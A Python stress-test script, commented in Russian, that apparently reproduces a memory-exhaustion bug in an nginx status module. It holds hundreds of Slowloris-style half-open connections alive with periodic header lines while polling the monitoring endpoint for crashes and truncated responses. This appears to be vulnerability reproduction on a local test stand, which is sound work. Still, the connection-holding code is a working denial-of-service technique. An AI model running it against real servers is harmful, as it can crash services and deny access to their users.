#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# status_stress.py — Сценарий 2, нагрузочный генератор (метод A/B).
# Делает две вещи одновременно:
#   1) держит N «полуоткрытых» соединений с незавершённым заголовком —
#      nginx выделяет под каждое буферы и держит их, память воркеров растёт;
#   2) параллельно каждые --poll секунд выполняет ПОЛНЫЙ запрос к эндпоинту
#      мониторинга и фиксирует аномалии: пустые ответы, обрывы, не-200.
# Именно в момент построения ответа мониторинга при исчерпанном лимите памяти
# и должен сработать уязвимый путь макросов ngx_bb_tail / ngx_bb_undo.
#
# Только стандартная библиотека. Пример запуска:
#   python3 status_stress.py --url http://127.0.0.1:8080/status --conns 800 --hold 90 --poll 0.2
# Остановка: Ctrl+C (отчёт всё равно будет напечатан и сохранён).
# ============================================================================
import argparse
import asyncio
import json
import resource
import sys
import time
import urllib.parse

# ---------------------------------------------------------------- параметры
def parse_args():
    p = argparse.ArgumentParser(description="Нагрузочный генератор для стенда extstatus")
    p.add_argument("--url", required=True, help="URL эндпоинта мониторинга")
    p.add_argument("--conns", type=int, default=500, help="число держащих соединений (по умолчанию 500)")
    p.add_argument("--hold", type=int, default=60, help="длительность теста, секунд (по умолчанию 60)")
    p.add_argument("--poll", type=float, default=0.2, help="пауза между запросами мониторинга, секунд")
    return p.parse_args()


def raise_nofile():
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    target = min(65535, hard)
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
    except (ValueError, OSError):
        pass
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    return soft


# ---------------------------------------------------------------- соединения-«держатели»
async def holders(host, port, path, count, deadline, stats):
    """Открывает count соединений и держит их, периодически дописывая
    строку заголовка (запрос так и остаётся незавершённым)."""
    tasks = []

    async def one(idx):
        try:
            reader, writer = await asyncio.open_connection(host, port)
            # Шлём начало запроса БЕЗ пустой строки, завершающей заголовки:
            w = writer
            w.write(("GET /" + path + " HTTP/1.1\r\nHost: " + host + "\r\n").encode())
            await w.drain()
            stats["held"] += 1
            # пока идёт тест — подкидываем строку заголовка раз в 15 секунд,
            # чтобы nginx не закрыл соединение по client_header_timeout
            while asyncio.get_event_loop().time() < deadline:
                await asyncio.sleep(15)
                w.write(b"X-Keep: " + str(idx).encode() + b"\r\n")
                await w.drain()
            w.close()
            try:
                await w.wait_closed()
            except Exception:
                pass
        except Exception as e:
            stats["hold_err"] += 1
            stats["hold_err_last"] = type(e).__name__ + ": " + str(e)[:80]

    for i in range(count):
        tasks.append(asyncio.ensure_future(one(i)))
    await asyncio.gather(*tasks)


# ---------------------------------------------------------------- запросы мониторинга
async def poller(host, port, path, deadline, poll, stats):
    n = 0
    while asyncio.get_event_loop().time() < deadline:
        n += 1
        ts = time.strftime("%H:%M:%S")
        try:
            reader, writer = await asyncio.open_connection(host, port)
            req = ("GET /" + path + " HTTP/1.1\r\nHost: " + host +
                   "\r\nUser-Agent: status-stress\r\nConnection: close\r\n\r\n")
            writer.write(req.encode())
            await writer.drain()
            data = await asyncio.wait_for(reader.read(), timeout=5)
            writer.close()
            if not data:
                stats["anomalies"].append((ts, "ПУСТОЙ ОТВЕТ — вероятна гибель воркера"))
            else:
                first = data.split(b"\r\n", 1)[0].decode("latin-1", errors="replace")
                if (" 200 " not in first + " "):
                    stats["anomalies"].append((ts, "НЕ-200: " + first))
                if b"\r\n\r\n" not in data:
                    stats["anomalies"].append((ts, "ОБРЫВ ОТВЕТА без заголовков: " + first))
                # признак искажения размера: заголовок Content-Length есть,
                # но тело пришло меньшего размера
                head, _, body = data.partition(b"\r\n\r\n")
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        try:
                            declared = int(line.split(b":")[1].strip())
                            if declared != len(body) and len(body) > 0:
                                stats["anomalies"].append(
                                    (ts, "РАСХОЖДЕНИЕ Content-Length: заявлено %d, фактически %d"
                                     % (declared, len(body))))
                        except ValueError:
                            pass
        except (ConnectionResetError, BrokenPipeError) as e:
            stats["anomalies"].append((ts, "СБРОС СОЕДИНЕНИЯ: " + type(e).__name__))
        except asyncio.TimeoutError:
            stats["anomalies"].append((ts, "ТАЙМАУТ ОТВЕТА (>5 с)"))
        except Exception as e:
            stats["anomalies"].append((ts, "ОШИБКА: " + type(e).__name__ + ": " + str(e)[:80]))
        stats["polls"] = n
        await asyncio.sleep(poll)


# ---------------------------------------------------------------- главный цикл
async def main():
    args = parse_args()
    u = urllib.parse.urlparse(args.url)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    path = (u.path or "/").lstrip("/")
    if u.query:
        path += "?" + u.query

    nofile = raise_nofile()
    conns = max(0, min(args.conns, nofile - 200))
    if conns < args.conns:
        print("[!] Лимит открытых файлов %d: число соединений уменьшено до %d" % (nofile, conns))

    stats = {"held": 0, "hold_err": 0, "hold_err_last": "", "polls": 0, "anomalies": []}
    loop = asyncio.get_event_loop()
    deadline = loop.time() + args.hold

    print("Цель: %s (хост %s, порт %d, путь /%s)" % (args.url, host, port, path))
    print("Соединений-держателей: %d, длительность: %d c, опрос каждые %.1f c"
          % (conns, args.hold, args.poll))
    print("Остановка — Ctrl+C. Наблюдайте параллельно: watch_nginx.sh, error.log, dmesg.\n")

    htask = asyncio.ensure_future(holders(host, port, path, conns, deadline + 5, stats))
    ptask = asyncio.ensure_future(poller(host, port, path, deadline, args.poll, stats))

    try:
        while not ptask.done():
            await asyncio.sleep(2)
            print("  [время] держится соединений: %d (ошибок: %d) | запросов: %d | аномалий: %d"
                  % (stats["held"], stats["hold_err"], stats["polls"], len(stats["anomalies"])))
            if loop.time() > deadline:
                break
    except KeyboardInterrupt:
        print("\n[!] Остановка по Ctrl+C...")
    ptask.cancel()
    htask.cancel()

    # ------------------------------------------------ итоговый отчёт
    print("\n================ ИТОГ ================")
    print("Полных запросов к эндпоинту: %d" % stats["polls"])
    print("Открыто держащих соединений: %d (ошибок открытия: %d)"
          % (stats["held"], stats["hold_err"]))
    if stats["hold_err_last"]:
        print("Последняя ошибка держателя: %s" % stats["hold_err_last"])
    print("Аномалий зафиксировано: %d" % len(stats["anomalies"]))
    for ts, msg in stats["anomalies"][-20:]:
        print("  %s  %s" % (ts, msg))
    if not stats["anomalies"]:
        print("  (нет — ответы были штатными на протяжении всего теста)")

    try:
        with open("/tmp/status_stress_report.json", "w") as f:
            json.dump(stats, f, ensure_ascii=False, indent=2)
        print("Полный отчёт: /tmp/status_stress_report.json (его собирает collect_evidence.sh)")
    except OSError:
        print("[!] Не удалось записать отчёт в /tmp — пропускаю")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nПрервано пользователем.")
        sys.exit(130)
